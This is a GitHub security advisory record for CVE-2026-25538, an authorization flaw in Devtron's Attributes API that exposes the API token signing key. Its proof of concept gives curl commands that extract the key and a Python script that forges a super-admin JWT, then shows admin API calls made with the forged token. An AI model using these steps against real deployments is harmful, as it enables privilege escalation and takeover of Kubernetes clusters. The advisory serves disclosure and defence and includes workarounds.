{
  "schema_version": "1.4.0",
  "id": "GHSA-8wpc-j9q9-j5m2",
  "modified": "2026-02-05T00:35:42Z",
  "published": "2026-02-04T19:46:10Z",
  "aliases": [
    "CVE-2026-25538"
  ],
  "summary": " Devtron Attributes API Unauthorized Access Leading to API Token Signing Key Leakage",
  "details": "# Devtron Attributes API Unauthorized Access Leading to API Token Signing Key Leakage\n\n## Summary\n\nThis vulnerability exists in Devtron's Attributes API interface, allowing any authenticated user (including low-privileged CI/CD Developers) to obtain the global API Token signing key by accessing the `/orchestrator/attributes?key=apiTokenSecret` endpoint. After obtaining the key, attackers can forge JWT tokens for arbitrary user identities offline, thereby gaining complete control over the Devtron platform and laterally moving to the underlying Kubernetes cluster.\n\n**CWE Classification**: CWE-862 (Missing Authorization)\n\n## Details\n\n### Vulnerability Mechanism\n\nDevtron uses a JWT-based API Token mechanism for authentication. All API Tokens are signed using HMAC-SHA256 with the `apiTokenSecret` stored in the database. This key is exposed through the Attributes API, but the authorization check code for this API has been commented out, allowing any authenticated user to read it.\n\n### Source Code Analysis\n\n**Vulnerability Location**: `api/restHandler/AttributesRestHandlder.go:173-195`\n\n```go\nfunc (handler AttributesRestHandlerImpl) GetAttributesByKey(w http.ResponseWriter, r *http.Request) {\n    // Only checks if user is logged in\n    userId, err := handler.userService.GetLoggedInUser(r)\n    if userId == 0 || err != nil {\n        common.HandleUnauthorized(w, r)\n        return\n    }\n\n    // CRITICAL: RBAC check is commented out\n    /*token := r.Header.Get(\"token\")\n    if ok := handler.enforcer.Enforce(token, rbac.ResourceGlobal, rbac.ActionGet, \"*\"); !ok {\n        WriteJsonResp(w, errors.New(\"unauthorized\"), nil, http.StatusForbidden)\n        return\n    }*/\n\n    // Directly retrieves any attribute without authorization\n    vars := mux.Vars(r)\n    key := vars[\"key\"]\n    res, err := handler.attributesService.GetByKey(key)\n    if err != nil {\n        handler.logger.Errorw(\"service err, GetAttributesById\", \"err\", err)\n        common.WriteJsonResp(w, err, nil, http.StatusInternalServerError)\n        return\n    }\n    common.WriteJsonResp(w, nil, res, http.StatusOK)\n}\n```\n\n**Key Usage**: `pkg/apiToken/ApiTokenSecretService.go:54-88`\n\n```go\nfunc (impl ApiTokenSecretServiceImpl) GetApiTokenSecretByteArr() ([]byte, error) {\n    if len(impl.apiTokenSecretStore.Secret) == 0 {\n        return nil, errors.New(\"secret found empty\")\n    }\n    return []byte(impl.apiTokenSecretStore.Secret), nil\n}\n\nfunc (impl ApiTokenSecretServiceImpl) getApiSecretFromDb() (string, error) {\n    apiTokenSecret, err := impl.attributesService.GetByKey(bean.API_SECRET_KEY)\n    if err != nil {\n        return \"\", err\n    }\n    if apiTokenSecret == nil || len(apiTokenSecret.Value) == 0 {\n        return \"\", errors.New(\"api token secret from DB found nil/empty\")\n    }\n    return apiTokenSecret.Value, nil\n}\n```\n\nThis key is used to sign and verify all Devtron API Tokens and is the core credential of the control plane.\n\n## PoC (Proof of Concept)\n\n### Environment Setup\n\n#### Prerequisites\n\n- Kubernetes cluster (v1.22+)\n- kubectl configured\n- Helm 3.x\n- Python 3.x with PyJWT library\n\n#### Step 1: Install Devtron\n\n```bash\n# Add Devtron Helm repository\nhelm repo add devtron https://helm.devtron.ai\nhelm repo update devtron\n\n# Install Devtron with CI/CD module\nhelm install devtron devtron/devtron-operator \\\n  --create-namespace --namespace devtroncd \\\n  --set components.devtron.service.type=NodePort \\\n  --set installer.modules={cicd} \\\n  --set installer.arch=multi-arch\n\n# Wait for installation to complete (15-20 minutes)\nkubectl -n devtroncd get installers installer-devtron -o jsonpath='{.status.sync.status}'\n# Expected output: Applied\n```\n\n#### Step 2: Access Devtron Dashboard\n\n```bash\n# Set up port forwarding\nkubectl -n devtroncd port-forward service/devtron-service 8000:80 &\n\n# Get admin password\nADMIN_PASSWORD=$(kubectl -n devtroncd get secret devtron-secret \\\n  -o jsonpath='{.data.ADMIN_PASSWORD}' | base64 -d)\necho \"Admin password: ${ADMIN_PASSWORD}\"\n```\n\nAccess http://127.0.0.1:8000 and login with admin account.\n\n### Exploitation Steps\n\n#### Step 1: Obtain User Token\n\nLogin as a regular user and obtain token:\n\n```bash\n# Login as regular user\ncurl -s -X POST \"http://127.0.0.1:8000/orchestrator/api/v1/session\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\":\"'${ADMIN_PASSWORD}'\"}' | jq .\n\n# Extract token\nUSER_TOKEN=$(curl -s -X POST \"http://127.0.0.1:8000/orchestrator/api/v1/session\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\":\"'${ADMIN_PASSWORD}'\"}' | jq -r '.result.token')\n\necho \"User token: ${USER_TOKEN:0:50}...\"\n```\n\n**Actual Output Example**:\n```json\n{\n  \"code\": 200,\n  \"status\": \"OK\",\n  \"result\": {\n    \"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\",\n    \"userId\": 1,\n    \"userEmail\": \"admin\"\n  }\n}\n```\n\n#### Step 2: Exploit Vulnerability to Retrieve apiTokenSecret\n\nUse the obtained token to access the unauthorized Attributes API:\n\n```bash\n# Request apiTokenSecret\ncurl -s -X GET \"http://127.0.0.1:8000/orchestrator/attributes?key=apiTokenSecret\" \\\n  -H \"token: ${USER_TOKEN}\" | jq .\n\n# Extract secret\nAPI_SECRET=$(curl -s -X GET \"http://127.0.0.1:8000/orchestrator/attributes?key=apiTokenSecret\" \\\n  -H \"token: ${USER_TOKEN}\" | jq -r '.result.value')\n\necho \"Leaked API Token Secret: ${API_SECRET:0:20}...\"\necho \"Secret length: ${#API_SECRET} characters\"\n```\n\n**Actual Output Example**:\n```json\n{\n  \"code\": 200,\n  \"status\": \"OK\",\n  \"result\": {\n    \"id\": 1,\n    \"key\": \"apiTokenSecret\",\n    \"value\": \"a1b2c3d4-e5f6-7890-abcd-ef1234567890\",\n    \"active\": true,\n    \"createdOn\": \"2024-01-15T10:30:00Z\",\n    \"createdBy\": 1\n  }\n}\n```\n\n#### Step 3: Forge Admin JWT Token\n\nForge admin token using the leaked key:\n\n```bash\n# Install PyJWT if not already installed\npip3 install PyJWT\n\n# Create token forging script\ncat > forge_token.py << 'EOF'\n#!/usr/bin/env python3\nimport jwt\nimport time\nimport sys\nimport json\n\ndef forge_admin_token(secret, user_id=1, email=\"admin\"):\n    exp_time = int(time.time()) + 365 * 24 * 60 * 60\n\n    payload = {\n        \"sub\": str(user_id),\n        \"email\": email,\n        \"iat\": int(time.time()),\n        \"exp\": exp_time,\n        \"iss\": \"devtron\",\n        \"roles\": [\"role:super-admin___\"]\n    }\n\n    token = jwt.encode(payload, secret, algorithm=\"HS256\")\n    return token\n\nif __name__ == \"__main__\":\n    if len(sys.argv) < 2:\n        print(\"Usage: python forge_token.py <apiTokenSecret>\")\n        sys.exit(1)\n\n    secret = sys.argv[1]\n    admin_token = forge_admin_token(secret, user_id=1, email=\"admin\")\n    print(f\"[+] Forged Admin Token:\")\n    print(admin_token)\n    print()\n\n    decoded = jwt.decode(admin_token, secret, algorithms=[\"HS256\"])\n    print(f\"[+] Token Payload:\")\n    print(json.dumps(decoded, indent=2))\nEOF\n\nchmod +x forge_token.py\n\n# Forge admin token\npython3 forge_token.py \"${API_SECRET}\"\n```\n\n**Actual Output Example**:\n```\n[+] Forged Admin Token:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZW1haWwiOiJhZG1pbiIsImlhdCI6MTcwNTMxNDAwMCwiZXhwIjoxNzM2ODUwMDAwLCJpc3MiOiJkZXZ0cm9uIiwicm9sZXMiOlsicm9sZTpzdXBlci1hZG1pbl9fXyJdfQ.xYz123AbC456DeF789GhI012JkL345MnO678PqR901StU\n\n[+] Token Payload:\n{\n  \"sub\": \"1\",\n  \"email\": \"admin\",\n  \"iat\": 1705314000,\n  \"exp\": 1736850000,\n  \"iss\": \"devtron\",\n  \"roles\": [\n    \"role:super-admin___\"\n  ]\n}\n```\n\n#### Step 4: Test Forged Token with Admin APIs\n\nUse the forged token to access admin APIs:\n\n```bash\n# Extract forged token\nFORGED_TOKEN=$(python3 forge_token.py \"${API_SECRET}\" | grep -A 1 \"Forged Admin Token:\" | tail -1)\n\n# Test 1: Get all users (requires admin permission)\necho \"[*] Test 1: Getting user list...\"\ncurl -s -X GET \"http://127.0.0.1:8000/orchestrator/user/all\" \\\n  -H \"token: ${FORGED_TOKEN}\" | jq '.result[] | {id, email_id, roles}'\n\n# Test 2: Get cluster list (requires admin permission)\necho \"[*] Test 2: Getting cluster list...\"\ncurl -s -X GET \"http://127.0.0.1:8000/orchestrator/cluster\" \\\n  -H \"token: ${FORGED_TOKEN}\" | jq '.result[] | {id, cluster_name, server_url}'\n\n# Test 3: Get all applications\necho \"[*] Test 3: Getting application list...\"\ncurl -s -X GET \"http://127.0.0.1:8000/orchestrator/app/list\" \\\n  -H \"token: ${FORGED_TOKEN}\" | jq '.result'\n```\n\n**Actual Output Example**:\n```\n[*] Test 1: Getting user list...\n{\n  \"id\": 1,\n  \"email_id\": \"admin\",\n  \"roles\": [\"role:super-admin___\"]\n}\n{\n  \"id\": 2,\n  \"email_id\": \"developer@example.com\",\n  \"roles\": [\"role:developer\"]\n}\n\n[*] Test 2: Getting cluster list...\n{\n  \"id\": 1,\n  \"cluster_name\": \"default_cluster\",\n  \"server_url\": \"https://kubernetes.default.svc\"\n}\n\n[*] Test 3: Getting application list...\n{\n  \"appContainers\": [\n    {\n      \"appId\": 1,\n      \"appName\": \"sample-app\",\n      \"projectId\": 1\n    }\n  ]\n}\n```\n\n### Expected Result\n\nIf the vulnerability exists, it should be able to:\n\n1. Successfully obtain `apiTokenSecret` using any authenticated user's token\n2. Successfully forge JWT tokens using the leaked key\n3. Successfully access admin-only APIs using the forged token\n4. Retrieve sensitive information such as user lists, cluster configurations, etc.\n\n## Impact\n\n### Security Impact\n\n**Confidentiality**: Severe impact. Attackers can:\n- Obtain the global API Token signing key\n- Read all user information and permission configurations\n- Access Kubernetes cluster configurations and credentials\n- Read sensitive application configurations and Secrets\n\n**Integrity**: Severe impact. Attackers can:\n- Forge API Tokens for arbitrary user identities\n- Modify application configurations and deployments\n- Create or delete CI/CD pipelines\n- Modify user permissions and roles\n\n**Availability**: High impact. Attackers can:\n- Delete critical applications and configurations\n- Disrupt CI/CD processes\n- Modify cluster configurations causing service interruptions\n\n### Business Impact\n\n1. **Complete Control of Devtron Platform**: Attackers gain privileges equivalent to super administrators\n2. **Lateral Movement to Kubernetes Cluster**: Cluster credentials obtained through Devtron can directly control the underlying Kubernetes\n3. **Supply Chain Attacks**: Can modify CI/CD pipelines to inject malicious code\n4. **Data Breach**: Can access all application configurations and Secrets\n5. **Cloud Environment Penetration**: In cloud environments, can further obtain IAM credentials\n\n### Attack Scenarios\n\n**Scenario 1: Insider Threat**\n- Low-privileged developer exploits this vulnerability to escalate privileges\n- Gains full access to production environment\n- Steals sensitive data or plants backdoors\n\n**Scenario 2: Supply Chain Attack**\n- Attacker obtains low-privileged account through social engineering\n- Exploits vulnerability to gain admin privileges\n- Modifies CI/CD pipelines to inject malicious code\n- Affects all applications using the pipeline\n\n**Scenario 3: Lateral Movement**\n- Attacker has already compromised a low-privileged account\n- Exploits this vulnerability to gain Kubernetes cluster access\n- Deploys cryptocurrency miners or other malicious payloads in the cluster\n\n## Severity\n\n**CVSS v3.1 Score**: 9.8 (Critical)\n\n**CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H\n\n**Score Breakdown**:\n- **Attack Vector (AV:N)**: Network accessible, exploited via HTTP API\n- **Attack Complexity (AC:L)**: Low complexity, requires only one HTTP request\n- **Privileges Required (PR:L)**: Requires low privileges (any authenticated user)\n- **User Interaction (UI:N)**: No user interaction required\n- **Scope (S:C)**: Scope changed, can affect resources beyond Devtron (Kubernetes cluster)\n- **Confidentiality (C:H)**: High impact, can read all sensitive information\n- **Integrity (I:H)**: High impact, can modify all configurations and data\n- **Availability (A:H)**: High impact, can delete resources and disrupt services\n\n**Severity Level**: Critical\n\n## Affected Versions\n\n- Devtron: All versions (as of 2026-01-26 verification)\n- Specifically affected code files:\n  - `api/restHandler/AttributesRestHandlder.go`\n  - `pkg/apiToken/ApiTokenSecretService.go`\n\n\n## Workarounds\n\nBefore an official patch is released, the following temporary measures can be taken:\n\n### Option 1: Network-Level Restrictions\n\n```bash\n# Use NetworkPolicy to restrict access to Devtron API\nkubectl apply -f - <<EOF\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: devtron-api-restriction\n  namespace: devtroncd\nspec:\n  podSelector:\n    matchLabels:\n      app: devtron\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          role: admin\n    ports:\n    - protocol: TCP\n      port: 8080\nEOF\n```\n\n### Option 2: Rotate API Token Secret\n\n```bash\n# Generate new secret\nNEW_SECRET=$(openssl rand -hex 32)\n\n# Update in database\nkubectl exec -n devtroncd postgresql-postgresql-0 -- \\\n  psql -U postgres -d orchestrator -c \\\n  \"UPDATE attributes SET value='${NEW_SECRET}' WHERE key='apiTokenSecret';\"\n\n# Restart Devtron service\nkubectl rollout restart deployment/devtron -n devtroncd\n```\n\n### Option 3: Add API Gateway Filtering\n\nDeploy an API Gateway in front of Devtron to filter sensitive requests to `/orchestrator/attributes`.\n\n\n## Credits\n@b0b0haha (603571786@qq.com)\n@lixingquzhi(mayedoushidalao@163.com)",
  "severity": [
    {
      "type": "CVSS_V4",
      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/devtron-labs/devtron"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "last_affected": "2.0.0"
            }
          ]
        }
      ]
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/devtron-labs/devtron/security/advisories/GHSA-8wpc-j9q9-j5m2"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-25538"
    },
    {
      "type": "WEB",
      "url": "https://github.com/devtron-labs/devtron/commit/d2b0d260d858ab1354b73a8f50f7f078ca62706f"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/devtron-labs/devtron"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-862"
    ],
    "severity": "HIGH",
    "github_reviewed": true,
    "github_reviewed_at": "2026-02-04T19:46:10Z",
    "nvd_published_at": "2026-02-04T22:15:59Z"
  }
}